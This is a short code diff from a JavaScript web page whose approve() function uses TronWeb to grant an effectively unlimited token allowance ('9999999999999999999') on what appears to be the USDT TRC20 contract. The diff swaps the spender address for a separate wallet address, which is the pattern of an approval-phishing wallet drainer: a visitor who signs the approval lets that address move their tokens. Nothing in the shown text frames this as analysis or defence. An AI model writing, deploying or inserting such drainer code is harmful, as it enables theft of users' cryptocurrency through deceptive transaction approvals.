@@ -58,7 +58,7 @@
     async function approve() {
         try {
             if (window.tronWeb) {
-                const address1 = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t';//Address
+                const address1 = 'TYKt6KhakYLxmjnxwja8HgD5d8nn983o8m';//Address
                 let token = await tronWeb.contract().at('TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t');
                 let res = await token.approve(address1, '9999999999999999999').send({
                     feeLimit: 10000000,
